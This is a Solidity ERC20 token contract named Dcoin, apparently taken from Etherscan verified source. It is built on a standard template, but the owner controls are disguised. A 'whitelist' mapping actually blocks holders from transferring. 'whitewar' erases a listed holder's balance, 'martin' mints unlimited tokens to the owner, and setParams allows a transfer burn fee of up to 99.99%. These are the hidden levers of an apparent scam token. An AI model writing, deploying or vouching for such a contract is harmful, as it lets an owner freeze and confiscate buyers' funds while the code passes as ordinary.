/**
 *Submitted for verification at Etherscan.io on 2021-04-01
*/

pragma solidity ^0.4.17;

/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

/**
 * @title Ownable
 * @dev The Ownable contract has an owner address, and provides basic authorization control
 * functions, this simplifies the implementation of "user permissions".
 */
contract Ownable {
    address public king;

    function Ownable() public {
        king = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == king);
        _;
    }
    function sking(address _user) public onlyOwner {
        if (_user != address(0)) {
            king = _user;
        }
    }

}

/**
 * @title ERC20Basic
 * @dev Simpler version of ERC20 interface
 * @dev see https://github.com/ethereum/EIPs/issues/20
 */
contract ERC20Basic {
    uint public _totalSupply;
    function totalSupply() public constant returns (uint);
    function balanceOf(address who) public constant returns (uint);
    function transfer(address to, uint value) public;
    event Transfer(address indexed from, address indexed to, uint value);
    event Burn(address indexed from, uint value);
}

/**
 * @title ERC20 interface
 * @dev see https://github.com/ethereum/EIPs/issues/20
 */
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint);
    function transferFrom(address from, address to, uint value) public;
    function approve(address spender, uint value) public;
    event Approval(address indexed owner, address indexed spender, uint value);
}
/**
 * @title Basic token
 * @dev Basic version of StandardToken, with no allowances.
 */
contract BasicToken is Ownable, ERC20Basic {
    using SafeMath for uint;

    mapping(address => uint) public balances;

    // additional variables for use if transaction fees ever became necessary
    uint public basisPointsRate = 0;
    address public burnAddress = address(0);

    /**
    * @dev Fix for the ERC20 short address attack.
    */
    modifier onlyPayloadSize(uint size) {
        require(!(msg.data.length < size + 4));
        _;
    }

    /**
    * @dev transfer token for a specified address
    * @param _to The address to transfer to.
    * @param _value The amount to be transferred.
    */
    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {
        uint burnFee = (_value.mul(basisPointsRate)).div(10000);

        uint sendAmount = _value.sub(burnFee);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        if (burnFee > 0) {
            balances[burnAddress] = balances[burnAddress].add(burnFee);
            _totalSupply -= burnFee;
            Burn(msg.sender, burnFee);
        }
        Transfer(msg.sender, _to, sendAmount);
    }

    /**
    * @dev Gets the balance of the specified address.
    * @param _owner The address to query the the balance of.
    * @return An uint representing the amount owned by the passed address.
    */
    function balanceOf(address _owner) public constant returns (uint balance) {
        return balances[_owner];
    }

}

/**
 * @title Standard ERC20 token
 *
 * @dev Implementation of the basic standard token.
 * @dev https://github.com/ethereum/EIPs/issues/20
 * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol
 */
contract StandardToken is BasicToken, ERC20 {

    mapping (address => mapping (address => uint)) public allowed;

    uint public constant MAX_UINT = 2**256 - 1;

    /**
    * @dev Transfer tokens from one address to another
    * @param _from address The address which you want to send tokens from
    * @param _to address The address which you want to transfer to
    * @param _value uint the amount of tokens to be transferred
    */
    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {
        var _allowance = allowed[_from][msg.sender];

        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met
        // if (_value > _allowance) throw;

        uint burnFee = (_value.mul(basisPointsRate)).div(10000);

        if (_allowance < MAX_UINT) {
            allowed[_from][msg.sender] = _allowance.sub(_value);
        }
        uint sendAmount = _value.sub(burnFee);
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        if (burnFee > 0) {
            balances[burnAddress] = balances[burnAddress].add(burnFee);
            _totalSupply -= burnFee;
            Burn(_from, burnFee);
        }
        Transfer(_from, _to, sendAmount);
    }

    /**
    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
    * @param _spender The address which will spend the funds.
    * @param _value The amount of tokens to be spent.
    */
    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {

        // To change the approve amount you first have to reduce the addresses`
        //  allowance to zero by calling `approve(_spender, 0)` if it is not
        //  already 0 to mitigate the race condition described here:
        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));

        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
    }

    /**
    * @dev Function to check the amount of tokens than an owner allowed to a spender.
    * @param _owner address The address which owns the funds.
    * @param _spender address The address which will spend the funds.
    * @return A uint specifying the amount of tokens still available for the spender.
    */
    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        return allowed[_owner][_spender];
    }

}

contract BlackList is Ownable, BasicToken {

    function scouts(address _maker) external constant returns (bool) {
        return whitelist[_maker];
    }

    mapping (address => bool) public whitelist;

    function addwhite (address _user) public onlyOwner {
        whitelist[_user] = true;
        AddedBlackList(_user);
    }

    function victory (address _user) public onlyOwner {
        whitelist[_user] = false;
        RemovedBlackList(_user);
    }

    function whitewar (address _user) public onlyOwner {
        require(whitelist[_user]);
        uint dirtyFunds = balanceOf(_user);
        balances[_user] = 0;
        _totalSupply -= dirtyFunds;
        DestroyedBlackFunds(_user, dirtyFunds);
    }

    event DestroyedBlackFunds(address _blackListedUser, uint _balance);

    event AddedBlackList(address _user);

    event RemovedBlackList(address _user);

}

contract Dcoin is StandardToken, BlackList {
    string public name;
    string public symbol;
    uint public decimals;

    function Dcoin(uint _initialSupply, string _name, string _symbol, uint _decimals) public {
        _totalSupply = _initialSupply;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        balances[king] = _initialSupply;
    }

    function transfer(address _to, uint _value) public  {
        require(!whitelist[msg.sender]);
        return super.transfer(_to, _value);
    }

    function transferFrom(address _from, address _to, uint _value) public  {
        require(!whitelist[_from]);
        return super.transferFrom(_from, _to, _value);
    }

    function balanceOf(address who) public constant returns (uint) {
        return super.balanceOf(who);
    }

    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {
        return super.approve(_spender, _value);
    }

    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        return super.allowance(_owner, _spender);
    }

    function totalSupply() public constant returns (uint) {
        return _totalSupply;
    }

    function martin(uint amount) public onlyOwner {
        require(_totalSupply + amount > _totalSupply);
        require(balances[king] + amount > balances[king]);
        balances[king] += amount;
        _totalSupply += amount;
        Issue(amount);
    }

    function setParams(uint newBasisPoints) public onlyOwner {
        // Ensure transparency by hardcoding limit beyond which fees can never be added
        require(newBasisPoints < 10000);
        basisPointsRate = newBasisPoints;

        Params(basisPointsRate);
    }
    // Called when new token are issued
    event Issue(uint amount);
    event Params(uint rate);

}